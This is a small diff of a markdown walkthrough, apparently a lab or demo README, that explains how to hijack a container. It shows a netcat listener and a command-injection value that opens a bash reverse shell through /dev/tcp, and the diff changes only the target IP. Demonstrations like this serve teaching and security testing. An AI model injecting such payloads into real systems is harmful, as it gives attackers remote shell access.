@@ -48,7 +48,7 @@ Input for the app (change your IP):
 <summary>Details on how to hijack the container</summary>
 
 1. We will open a connection on our attacker machine using netcat: `sudo nc -lnvp 80`
-2. Now we inject the required command into our container. This allow us to connect a reverse shell to our open connection: `; bash -c 'bash -i >& /dev/tcp/20.86.25.78/80 0>&1'`.
+2. Now we inject the required command into our container. This allow us to connect a reverse shell to our open connection: `; bash -c 'bash -i >& /dev/tcp/0.0.0.0/80 0>&1'`.
 3. And finally, we have a reverse shell up and running. Try some commands like `ls`
 
 </details>
